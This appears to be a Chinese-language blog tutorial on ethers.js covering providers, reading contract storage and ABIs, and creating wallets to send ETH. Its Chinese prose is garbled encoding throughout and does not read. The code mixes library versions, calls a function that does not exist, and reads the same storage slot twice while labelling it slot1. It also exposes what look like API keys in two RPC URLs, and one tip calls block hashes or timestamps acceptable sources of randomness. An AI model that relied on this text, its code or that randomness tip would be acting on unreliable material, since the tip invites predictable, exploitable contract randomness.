from &quot;ethers&quot;; b. Bç«™è§†é¢‘ä¸­åœ¨vscodeä¸Šå®‰è£…çš„ethersåŒ…çš„å‘½ä»¤ä¸ºï¼š 1npm install ethers@5.6.9 è¿™è¡Œä»£ç ä¼šè®©ä»£ç æ— æ³•è¿è¡Œï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š 2. ç¼–å†™ Hello Vitalik2.1 ç¼–è¯‘å™¨ï¼š åœ¨çº¿ç¼–è¯‘å™¨ â€”â€“ playcode æœ¬åœ°ç¼–è¯‘å™¨ â€”â€“ VSCode 2.2 ç¬¬ä¸€æ®µä»£ç  ç¤ºä¾‹ä»£ç ï¼š 1234567import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider();const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;main() è§£è¯»ä»£ç  1234const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125; ä»£ç çš„æ„æ€ï¼š è¿™æ˜¯ä¸€æ®µä½¿ç”¨ JavaScript ç¼–å†™çš„ä»£ç ï¼Œä½¿ç”¨äº† ethers.js åº“ä¸ä»¥å¤ªåŠèŠ‚ç‚¹è¿›è¡Œäº¤äº’ã€‚ è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªå¼‚æ­¥å‡½æ•° main()ï¼Œåœ¨å‡½æ•°ä¸­ï¼š ä½¿ç”¨ provider.getBalance() å‡½æ•°è·å– vitalik.eth åœ°å€ä¸Šçš„ä»¥å¤ªå¸ä½™é¢ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ balance å˜é‡ä¸­ã€‚è¿™é‡Œçš„ provider æ˜¯ä¸€ä¸ª ethers.js åº“ä¸­æä¾›çš„ä»¥å¤ªåŠèŠ‚ç‚¹å¯¹è±¡ï¼Œå®ƒç”¨äºä¸ä»¥å¤ªåŠç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚ ä½¿ç”¨ ethers.utils.formatEther() å‡½æ•°å°†ä»¥å¤ªå¸ä½™é¢ä» wei å•ä½è½¬æ¢ä¸ºä»¥å¤ªå¸å•ä½ï¼Œå¹¶å°†ç»“æœæ‰“å°åˆ°æ§åˆ¶å°ä¸­ã€‚ å› ä¸º getBalance() å‡½æ•°æ˜¯å¼‚æ­¥å‡½æ•°ï¼Œå®ƒä¼šä»ä»¥å¤ªåŠç½‘ç»œä¸­è¯»å–æ•°æ®ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ await å…³é”®å­—ç­‰å¾…å®ƒå®Œæˆè¯»å–æ“ä½œã€‚åœ¨ç­‰å¾… getBalance() å‡½æ•°å®Œæˆåï¼Œbalance å˜é‡å°†åŒ…å«è¿”å›çš„ä½™é¢å€¼ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œå¤„ç†å¹¶æ‰“å°åˆ°æ§åˆ¶å°ä¸­ã€‚ ethers.js_day023. Provider æä¾›å™¨3.1 è¿è¡Œå¦‚ä¸‹ä»£ç æŠ¥é”™ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// å¯¼å…¥ethersåŒ…import &#123; ethers &#125; from &quot;ethers&quot;;// playcodeå…è´¹ç‰ˆä¸èƒ½å®‰è£…ethersï¼Œç”¨è¿™æ¡å‘½ä»¤ï¼Œéœ€è¦ä»ç½‘ç»œä¸ŠimportåŒ…ï¼ˆæŠŠä¸Šé¢è¿™è¡Œæ³¨é‡Šæ‰ï¼‰// import &#123; ethers &#125; from &quot;https://cdn-cors.ethers.io/lib/ethers-5.6.9.esm.min.js&quot;;// åˆ©ç”¨Alchemyçš„rpcèŠ‚ç‚¹è¿æ¥ä»¥å¤ªåŠç½‘ç»œ// å‡†å¤‡ alchemy API å¯ä»¥å‚è€ƒhttps://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL04_Alchemy/readme.md const ALCHEMY_MAINNET_URL = &#x27;https://eth-mainnet.g.alchemy.com/v2/oKmOQKbneVkxgHZfibs-iFhIlIAl6HDN&#x27;;const ALCHEMY_GOERLI_URL = &#x27;https://eth-goerli.alchemyapi.io/v2/GlaeWuylnNM3uuOo-SAwJxuwTdqHaY5l&#x27;;// è¿æ¥ä»¥å¤ªåŠä¸»ç½‘const providerETH = new ethers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// è¿æ¥Goerliæµ‹è¯•ç½‘const providerGoerli = new ethers.JsonRpcProvider(ALCHEMY_GOERLI_URL)const main = async () =&gt; &#123; // åˆ©ç”¨providerè¯»å–é“¾ä¸Šä¿¡æ¯ // 1. æŸ¥è¯¢vitalikåœ¨ä¸»ç½‘å’ŒGoerliæµ‹è¯•ç½‘çš„ETHä½™é¢ console.log(&quot;1. æŸ¥è¯¢vitalikåœ¨ä¸»ç½‘å’ŒGoerliæµ‹è¯•ç½‘çš„ETHä½™é¢&quot;); const balance = await providerETH.getBalance(`vitalik.eth`); const balanceGoerli = await providerGoerli.getBalance(`vitalik.eth`); // å°†ä½™é¢è¾“å‡ºåœ¨consoleï¼ˆä¸»ç½‘ï¼‰ console.log(`ETH Balance of vitalik: $&#123;ethers.formatEther(balance)&#125; ETH`); // è¾“å‡ºGoerliæµ‹è¯•ç½‘ETHä½™é¢ console.log(`Goerli ETH Balance of vitalik: $&#123;ethers.formatEther(balanceGoerli)&#125; ETH`); // 2. æŸ¥è¯¢providerè¿æ¥åˆ°äº†å“ªæ¡é“¾ console.log(&quot;\\n2. æŸ¥è¯¢providerè¿æ¥åˆ°äº†å“ªæ¡é“¾&quot;) const network = await providerETH.getNetwork(); console.log(network.toJSON()); // 3. æŸ¥è¯¢åŒºå—é«˜åº¦ console.log(&quot;\\n3. æŸ¥è¯¢åŒºå—é«˜åº¦&quot;) const blockNumber = await providerETH.getBlockNumber(); console.log(blockNumber); // 4. æŸ¥è¯¢ vitalik é’±åŒ…å†å²äº¤æ˜“æ¬¡æ•° console.log(&quot;\\n4. æŸ¥è¯¢ vitalik é’±åŒ…å†å²äº¤æ˜“æ¬¡æ•°&quot;) const txCount = await providerETH.getTransactionCount(&quot;vitalik.eth&quot;); console.log(txCount); // 5. æŸ¥è¯¢å½“å‰å»ºè®®çš„gasè®¾ç½® console.log(&quot;\\n5. æŸ¥è¯¢å½“å‰å»ºè®®çš„gasè®¾ç½®&quot;) const feeData = await providerETH.getFeeData(); console.log(feeData); // 6. æŸ¥è¯¢åŒºå—ä¿¡æ¯ console.log(&quot;\\n6. æŸ¥è¯¢åŒºå—ä¿¡æ¯&quot;) const block = await providerETH.getBlock(0); console.log(block); // 7. ç»™å®šåˆçº¦åœ°å€æŸ¥è¯¢åˆçº¦bytecodeï¼Œä¾‹å­ç”¨çš„WETHåœ°å€ console.log(&quot;\\n7. ç»™å®šåˆçº¦åœ°å€æŸ¥è¯¢åˆçº¦bytecodeï¼Œä¾‹å­ç”¨çš„WETHåœ°å€&quot;) const code = await providerETH.getCode(&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;); console.log(code);&#125;main() æŠ¥é”™ç»“æœå¦‚ä¸‹ï¼š æŠ¥é”™åŸå› æ˜¯è¯´ JsonRpcProvider ä¸æ˜¯ä¸€ä¸ªæ„é€ å™¨ï¼Œåˆ°å®˜æ–¹æ–‡æ¡£ä¸ŠæŸ¥çœ‹ï¼ŒJsonRpcProviderçš„ç”¨æ³•æ˜¯ï¼š 1234// è¿æ¥ä»¥å¤ªåŠä¸»ç½‘const providerETH = new ethers.providers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// è¿æ¥Goerliæµ‹è¯•ç½‘const providerGoerli = new ethers.providers.JsonRpcProvider(ALCHEMY_GOERLI_URL) RPCçš„è¿æ¥ 3.2 ä¸æœ¬åœ°çš„ganacheè·å–è¿æ¥ ä»£ç ï¼š 123456789import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);// æˆ‘è®¾ç½®çš„ç«¯å£å·ä¸º8545const address = &#x27;&#x27;; // æ›¿æ¢ä¸ºéœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·åœ°å€provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); â€‹ 3.3 ä¸ metamaskï¼ˆå°ç‹ç‹¸ğŸ¦Šé’±åŒ…ï¼‰å»ºç«‹è¿æ¥ 3.3.1 éœ€è¦åˆ° Alchemy ä¸Šè·å–RPC çš„èŠ‚ç‚¹ 12345678const provider = ethers.getDefaultProvider(&quot;&quot;); // ä»Alchemyè·å–const address = &#x27;&#x27;; // æ›¿æ¢ä¸ºéœ€è¦æŸ¥è¯¢ä½™é¢çš„è´¦æˆ·åœ°å€provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); 3.4 åˆ©ç”¨Providerè¯»å–é“¾ä¸Šæ•°æ®tipsï¼šconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;); è¿™ä¸ªçš„è¿æ¥é€Ÿåº¦è¦æ¯”const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);çš„è¿æ¥é€Ÿåº¦æ›´å¿« 3.5 è·å–æŒ‡å®šåœ°å€çš„ä½™é¢ â€“ provider.getBalance(address) ä»£ç ï¼š 12345&gt;provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&gt;&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&gt;&#125;); è§£é‡Šï¼š è¿™æ®µä»£ç æ˜¯ä½¿ç”¨ä»¥å¤ªåŠ JavaScript åº“ Ethers.js æ¥æŸ¥è¯¢æŒ‡å®šä»¥å¤ªåŠåœ°å€çš„ä½™é¢ï¼Œå¹¶å°†å…¶ä»¥ä»¥å¤ªå¸ï¼ˆETHï¼‰çš„å½¢å¼æ‰“å°åˆ°æ§åˆ¶å°ä¸Šã€‚ å…·ä½“æ¥è¯´ï¼Œè¿™æ®µä»£ç æ‰§è¡Œäº†ä»¥ä¸‹æ­¥éª¤ï¼š è°ƒç”¨ provider.getBalance(address) æ–¹æ³•ï¼Œå…¶ä¸­ provider æ˜¯ä¸€ä¸ªä»¥å¤ªåŠèŠ‚ç‚¹æä¾›å•†ï¼Œaddress æ˜¯è¦æŸ¥è¯¢çš„ä»¥å¤ªåŠåœ°å€ã€‚ getBalance() æ–¹æ³•è¿”å›ä¸€ä¸ª Promiseï¼Œè¯¥ Promise åœ¨æŸ¥è¯¢å®Œæˆåè¿”å›ä»¥å¤ªåŠåœ°å€çš„ä½™é¢ã€‚ å½“ Promise è¢«è§£ææ—¶ï¼Œthen() æ–¹æ³•ä¸­çš„å›è°ƒå‡½æ•°ä¼šè¢«æ‰§è¡Œã€‚è¯¥å›è°ƒå‡½æ•°ä½¿ç”¨ ethers.utils.formatEther() æ–¹æ³•å°†ä½™é¢ä» wei è½¬æ¢ä¸ºä»¥å¤ªï¼Œå¹¶å°†ç»“æœæ‰“å°åˆ°æ§åˆ¶å°ä¸Šã€‚ å¦‚æœ Promise è¢«æ‹’ç»ï¼ˆå³æŸ¥è¯¢å¤±è´¥ï¼‰ï¼Œåˆ™ catch() æ–¹æ³•ä¸­çš„å›è°ƒå‡½æ•°ä¼šè¢«æ‰§è¡Œï¼Œè¯¥å›è°ƒå‡½æ•°å°†é”™è¯¯ä¿¡æ¯æ‰“å°åˆ°æ§åˆ¶å°ä¸Š 3.6 æŸ¥è¯¢providerè¿æ¥åˆ°é‚£æ¡é“¾ â€“ provider.getNetwork() ä»£ç ï¼š 1const netWork = await provider.getNetwork(); æŸ¥è¯¢ç»“æœï¼š 3.7 æŸ¥è¯¢å½“å‰ gas price â€” provider.getGasPrice() tips:è¿”å›çš„æ•°æ®æ ¼å¼ä¸ºBigNumberï¼Œå¯ä»¥ç”¨BigNumberç±»çš„toNumber()æˆ–toString() æ–¹æ³•è½¬æ¢æˆæ•°å­—æˆ–è€…å­—ç¬¦ä¸² ä»£ç ï¼š 12&gt;const gas_price = await provider.getGasPrice();&gt;console.log(gas_price.toString()); è¿è¡Œç»“æœï¼š 3.8 æŸ¥è¯¢åŒºå—ä¿¡æ¯ â€“ provider.getBlock() ä»£ç ï¼š 1const block = await provider.getBlock(2); æŸ¥è¯¢ç»“æœï¼š 3.9 æŸ¥è¯¢åœ°å€çš„åˆçº¦bytecode â€” provider.getCode(address) ä»£ç ï¼š 12const address = &quot;0x44f2A5d2CFf45111E5FdcBE600CfA62Ea0386E7f&quot;; //åˆçº¦åœ°å€const code = await providerETH.getCode(address); æŸ¥è¯¢ç»“æœï¼š 4.è¯»å–åˆçº¦ä¿¡æ¯4.1 åˆ›å»ºContractå˜é‡4.1.1 åªè¯»Contract tipsï¼šå‚æ•°åˆ†åˆ«æ˜¯åˆçº¦åœ°å€ï¼Œåˆçº¦çš„abiå’Œproviderå˜é‡ï¼ˆåªè¯»ï¼‰ ä»£ç ï¼š 1const contract = new ethers.Contract(`address`,`abi`,`provider`) 4.1.2 å¯è¯»å†™ Contract tips: å‚æ•°åˆ†åˆ«æ˜¯åˆçº¦åœ°å€ï¼Œåˆçº¦çš„abiå’Œsingerå˜é‡ã€‚Singerç­¾åè€…æ˜¯ethersä¸­å¦ä¸€ä¸ªç±»ï¼Œç”¨äºç­¾åäº¤æ˜“ã€‚ ä»£ç ï¼š 1const contract = new ethers.Contract(`address`, `abi`, `signer`); 4.2 åˆ›å»ºåªè¯» Contractå®ä¾‹tipsï¼šåˆ›å»ºContractå®ä¾‹éœ€è¦å¡«å…¥ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯åˆçº¦åœ°å€ï¼Œåˆçº¦abiå’Œproviderå˜é‡ã€‚ tips:ehtersæ”¯æŒä¸¤ç§abiå¡«æ³• æ–¹æ³•ä¸€ï¼šç›´æ¥è¾“å‡ºåˆçº¦çš„abiã€‚ä¹Ÿå¯ä»¥åƒä¹‹å‰web3ä¸­é‚£æ ·ä½¿ç”¨ fsåŒ…è¯»å– .abiæ–‡ä»¶ï¼Œæˆ‘è§‰å¾—è¿™ç§å¯è¯»æ€§æ›´å¼ºä¸€äº›ã€‚ 1234var fs = require(&quot;fs&quot;);var path = &quot;&quot;;//è¿™é‡Œæ˜¯ä½ æœ¬åœ°abiçš„æ–‡ä»¶åœ°å€var contractABI = JSON.parse(fs.readFileSync(path),toString()); å‚è€ƒä»£ç ï¼š 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; int public value = 5; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125; function getValue() external view returns(int) &#123; return value; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥ethersåŒ…// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥fsåŒ…const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// è¯»å–æ–‡ä»¶çš„abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// åˆçº¦åœ°å€let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// åˆ›å»ºåˆçº¦let contract = new ethers.Contract(con_Address,con_ABI,provider);async function main() &#123; let slot0 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot0 = &gt;&quot; + slot0); let slot1 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot1 = &gt;&quot; + slot1);&#125; // è°ƒç”¨å‡½æ•°main()// è°ƒç”¨åˆçº¦çš„åªè¯»å‡½æ•°let value = await contract.getValue();console.log(&quot;value =&gt; &quot; + value);let address = &quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;;provider.getBalance(address).then((balance)=&gt;&#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;) è¿è¡Œç»“æœï¼š æ³¨: åœ¨Solidityä¸­ï¼Œå¸ƒå°”ç±»å‹(bool)çš„é»˜è®¤å€¼æ˜¯falseã€‚åœ¨ä½ çš„æ™ºèƒ½åˆçº¦ä¸­ï¼Œå­˜å‚¨æ§½(slot)çš„ä½ç½®ä¸º0ï¼Œå­˜å‚¨çš„å˜é‡æ˜¯å¸ƒå°”ç±»å‹(isComplete)ï¼Œå› æ­¤é»˜è®¤å€¼ä¸ºfalseã€‚ å½“ä½ éƒ¨ç½²åˆçº¦æ—¶ï¼Œå­˜å‚¨æ§½çš„åˆå§‹å€¼ä¼šè¢«è®¾ç½®ä¸ºfalseã€‚å¦‚æœåœ¨ä¹‹ååˆçº¦çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨äº†callme()å‡½æ•°ï¼ŒisCompleteå˜é‡çš„å€¼ä¼šè¢«è®¾ç½®ä¸ºtrueï¼Œå­˜å‚¨æ§½çš„å€¼ä¹Ÿä¼šç›¸åº”åœ°è¢«æ›´æ–°ä¸ºtrueã€‚ åœ¨ä½¿ç”¨ethersæŸ¥è¯¢å­˜å‚¨æ§½çš„å€¼æ—¶ï¼Œå¦‚æœå­˜å‚¨æ§½çš„å€¼ä¸ºfalseï¼ŒæŸ¥è¯¢ç»“æœä¼šæ˜¾ç¤ºä¸º0x0ã€‚å¦‚æœå­˜å‚¨æ§½çš„å€¼ä¸ºtrueï¼ŒæŸ¥è¯¢ç»“æœä¼šæ˜¾ç¤ºä¸º0x1ã€‚ å› æ­¤ï¼Œå¦‚æœä½ åœ¨æŸ¥è¯¢æ™ºèƒ½åˆçº¦çš„å­˜å‚¨æ§½æ—¶å¾—åˆ°çš„ç»“æœæ˜¯0x0ï¼Œè¿™æ„å‘³ç€å­˜å‚¨æ§½çš„å€¼ä¸ºfalseï¼Œå³isCompleteå˜é‡è¿˜æ²¡æœ‰è¢«è®¾ç½®ä¸ºtrueã€‚å¦‚æœä½ æƒ³è¦è·å–å­˜å‚¨æ§½çš„å®é™…å€¼ï¼Œå¯ä»¥å°†æŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºå¸ƒå°”ç±»å‹ï¼Œå¦‚ä¸‹æ‰€ç¤º: 123const slot0 = await provider.getStorageAt(contractAddress, 0);const isComplete = ethers.utils.bigNumberify(slot0).toNumber() !== 0;console.log(`isComplete: $&#123;isComplete&#125;`); è¿™æ®µä»£ç å°†æŸ¥è¯¢ç»“æœè½¬æ¢ä¸ºBigNumberç±»å‹ï¼Œå¹¶å°†å…¶è½¬æ¢ä¸ºæ•°å­—ç±»å‹ã€‚å¦‚æœæ•°å­—ä¸ä¸º0ï¼ŒisCompleteå˜é‡çš„å€¼ä¸ºtrueï¼Œå¦åˆ™ä¸ºfalseã€‚ æ–¹æ³•äºŒï¼šç”±äºabiå¯è¯»æ€§å¤ªå·®ï¼Œethersåˆ›æ–°çš„å¼•å…¥äº†äººç±»å¯è¯»ABIã€‚å¼€å‘è€…å¯ä»¥é€šè¿‡function signatureå’Œevent signatureæ¥å†™ABIã€‚ å‚è€ƒä»£ç ï¼š 123456789101112131415161718192021222324252627import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥ethersåŒ…// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6æ¨¡å—ä¸‹å¼•å…¥fsåŒ…const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// è¯»å–æ–‡ä»¶çš„abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// åˆçº¦åœ°å€let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// åˆ›å»ºåˆçº¦let contract = new ethers.Contract(con_Address,con_ABI,provider);let abi = [ &quot;function callme() public&quot;, &quot;function getValue() external view returns(int)&quot;,]let contract1 = new ethers.Contract(con_Address,abi,provider);async function demo1()&#123; // è°ƒç”¨åˆçº¦çš„åªè¯»å‡½æ•° let value = await contract1.getValue(); console.log(&quot;demo1&#x27;s value =&gt; &quot; + value);&#125;demo1() è¿è¡Œç»“æœï¼š 4.3 æ›´å¤šçš„è¯»å–åˆçº¦ä¿¡æ¯å¯åˆ° å®˜æ–¹æ–‡æ¡£ æŸ¥çœ‹5.å‘é€ETH5.1 Signerç­¾åç±»åœ¨ethersä¸­ï¼ŒSignerç­¾åè€…ç±»æ˜¯ä»¥å¤ªåŠè´¦æˆ·çš„æŠ½è±¡ç±»ï¼Œå¯ç”¨äºå¯¹æ¶ˆæ¯å’Œäº¤æ˜“è¿›è¡Œç­¾åï¼Œå¹¶å°†ç­¾åçš„äº¤æ˜“å‘é€åˆ°ä»¥å¤ªåŠç½‘ç»œï¼Œå¹¶æ›´æ”¹åŒºå—é“¾çŠ¶æ€ã€‚Signerç±»æ˜¯æŠ½è±¡ç±»ï¼Œä¸èƒ½ç›´æ¥å®ä¾‹åŒ–ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å®ƒçš„å­ç±»ï¼šWalleté’±åŒ…ç±»ã€‚ 5.2 Walleté’±åŒ…ç±»Walletç±»ç»§æ‰¿äº†Signeç±»ï¼Œå¹¶ä¸”å¼€å‘è€…å¯ä»¥åƒåŒ…å«ç§é’¥çš„å¤–éƒ¨æ‹¥æœ‰è€…è´¦æˆ·ï¼ˆEOAï¼‰ä¸€æ ·ï¼Œç”¨å®ƒå¯¹äº¤æ˜“å’Œæ¶ˆæ¯è¿›è¡Œç­¾åã€‚ 5.2.1æ–¹æ³•ä¸€ï¼šåˆ›å»ºéšæœºçš„walletå¯¹è±¡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ethers.Wallet.createRandom()å‡½æ•°åˆ›å»ºå¸¦æœ‰éšæœºç§é’¥çš„Walletå¯¹è±¡ã€‚å¯¹è¯¥ç§é’¥ç”±åŠ å¯†å®‰å…¨çš„ç†µæºç”Ÿæˆï¼Œå¦‚æœå½“å‰ç¯å¢ƒæ²¡æœ‰å®‰å…¨çš„ç†µæºï¼Œåˆ™ä¼šå¼•å‘é”™è¯¯ã€‚ tipsï¼šåœ¨å¯†ç å­¦ä¸­ï¼Œç†µï¼ˆentropyï¼‰æ˜¯æŒ‡éšæœºæ€§çš„åº¦é‡ã€‚åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œç†µæºï¼ˆentropy sourceï¼‰æ˜¯æŒ‡ç”¨äºç”Ÿæˆéšæœºæ•°æˆ–éšæœºç§å­çš„æºå¤´ã€‚ åœ¨æ™ºèƒ½åˆçº¦ä¸­ï¼Œä¸ºäº†ç¡®ä¿éšæœºæ•°çš„å®‰å…¨æ€§å’Œä¸å¯é¢„æµ‹æ€§ï¼Œéœ€è¦ä½¿ç”¨ç†µæºæ¥ç”Ÿæˆéšæœºæ•°æˆ–éšæœºç§å­ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç†µæºå¯ä»¥æ˜¯å¤–éƒ¨çš„æ•°æ®æºï¼Œä¾‹å¦‚åŒºå—å“ˆå¸Œæˆ–è€…æ—¶é—´æˆ³ç­‰ï¼Œä¹Ÿå¯ä»¥æ˜¯åˆçº¦å†…éƒ¨çš„æ•°æ®æºï¼Œä¾‹å¦‚åˆçº¦çš„å­˜å‚¨æ§½æˆ–è€…åˆçº¦çš„æ‰§è¡Œç»“æœç­‰ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç†µæºçš„è´¨é‡å’Œå®‰å…¨æ€§å¯¹äºå¯†ç å­¦åº”ç”¨éå¸¸é‡è¦ã€‚å¦‚æœç†µæºä¸å¤Ÿéšæœºæˆ–è€…ä¸å¤Ÿå®‰å…¨ï¼Œå¯èƒ½ä¼šå¯¼è‡´éšæœºæ•°çš„å¯é¢„æµ‹æ€§ï¼Œä»è€Œç ´åå¯†ç å­¦åº”ç”¨çš„å®‰å…¨æ€§ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨ç†µæºç”Ÿæˆéšæœºæ•°æˆ–éšæœºç§å­æ—¶ï¼Œéœ€è¦é€‰æ‹©åˆé€‚çš„ç†µæºï¼Œå¹¶å¯¹å…¶è¿›è¡Œå……åˆ†çš„æµ‹è¯•å’ŒéªŒè¯ï¼Œä»¥ç¡®ä¿å…¶å®‰å…¨æ€§å’Œä¸å¯é¢„æµ‹æ€§ã€‚ 12// åˆ›å»ºéšæœºçš„walletå¯¹è±¡const wallet1 = new ethers.Wallet.createRandom() 5.2.2æ–¹æ³•äºŒï¼šç”¨ç§é’¥åˆ›å»ºwalletå¯¹è±¡æˆ‘ä»¬å·²çŸ¥ç§é’¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ethers.Wallet() å‡½æ•°åˆ›å»º Walletå¯¹è±¡ã€‚ ä»Ganacheä¸­è·å–privateKey 123// åˆ©ç”¨ç§é’¥å’Œprovideråˆ›å»ºwalletå¯¹è±¡const privateKey = &#x27;&#x27; // å¡«å…¥ä½ çš„ç§é’¥const wallet2 = new ethers.Wallet(privateKey, provider) 5.2.3æ–¹æ³•ä¸‰ï¼šä»åŠ©è®°è¯åˆ›å»ºwalletå¯¹è±¡æˆ‘ä»¬å·²çŸ¥åŠ©è®°è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥åˆ©ç”¨ ethers.Wallet.fromMnemonic() å‡½æ•°åˆ›å»ºWalletå¯¹è±¡ã€‚ 12// ä»åŠ©è®°è¯åˆ›å»ºwalletå¯¹è±¡const wallet3 = new ethers.Wallet.fromMnemonic(mnemonic.phrase) 5.2.4 å…¶ä»–æ–¹æ³•ï¼šé€šè¿‡JSONæ–‡ä»¶åˆ›å»ºwalletå¯¹è±¡é€šè¿‡ethers.Wallet.fromEncryptedJsonè§£å¯†ä¸€ä¸ªJSONé’±åŒ…æ–‡ä»¶åˆ›å»ºé’±åŒ…å®ä¾‹ï¼ŒJSONæ–‡ä»¶å³keystoreæ–‡ä»¶ï¼Œé€šå¸¸æ¥è‡ªGeth, Parityç­‰é’±åŒ… 5.3 å‘é€ETHæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Walletå®ä¾‹æ¥å‘é€ETHã€‚é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ªäº¤æ˜“è¯·æ±‚ï¼Œåœ¨é‡Œé¢å£°æ˜æ¥æ”¶åœ°å€toå’Œå‘é€çš„ETHæ•°é¢valueã€‚äº¤æ˜“è¯·æ±‚TransactionRequestç±»å‹å¯ä»¥åŒ…å«å‘é€æ–¹ fromï¼Œnonceå€¼ nounceï¼Œè¯·æ±‚æ•°æ®dataç­‰ä¿¡æ¯ã€‚ 12345// åˆ›å»ºäº¤æ˜“è¯·æ±‚ï¼Œå‚æ•°ï¼štoä¸ºæ¥æ”¶åœ°å€ï¼Œvalueä¸ºETHæ•°é¢const tx = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125; ç„¶åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨Walletç±»çš„sendTransactionæ¥å‘é€äº¤æ˜“ï¼Œç­‰å¾…äº¤æ˜“ä¸Šé“¾ï¼Œå¹¶è·å¾—äº¤æ˜“çš„æ•°æ®ã€‚ 1234//å‘é€äº¤æ˜“ï¼Œè·å¾—æ”¶æ®const receipt = await wallet2.sendTransaction(tx)await receipt.wait() // ç­‰å¾…é“¾ä¸Šç¡®è®¤äº¤æ˜“console.log(receipt) // æ‰“å°äº¤æ˜“è¯¦æƒ… 5.4 ä»£ç å®ä¾‹5.4.1åˆ›å»ºWalletå®ä¾‹ä¸‰ç§æ–¹æ³•çš„ç¤ºä¾‹ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738import &#123; ethers &#125; from &quot;ethers&quot;;const netWork = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.providers.JsonRpcProvider(netWork);// let balance = await provider.getBalance(&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;);// console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);/** æ–¹æ³•ä¸€ï¼šåˆ›å»ºéšæœºç§é’¥çš„Walletå¯¹è±¡ã€‚ è¿™ç§æ–¹æ³•åˆ›å»ºçš„é’±åŒ…æ˜¯å•æœºçš„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨connect(provider)å‡½æ•°ï¼Œè¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹ã€‚è¿™ç§æ–¹æ³•åˆ›å»ºçš„é’±åŒ…å¯ä»¥ç”¨mnemonicè·å–åŠ©è®°è¯ */const wallet1 = ethers.Wallet.createRandom();console.log(&quot;wallet1 =&gt;\\n&quot;,wallet1);const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;console.log(&quot;åŠ©è®°è¯ï¼š\\n&quot; , mnemonic);/** * 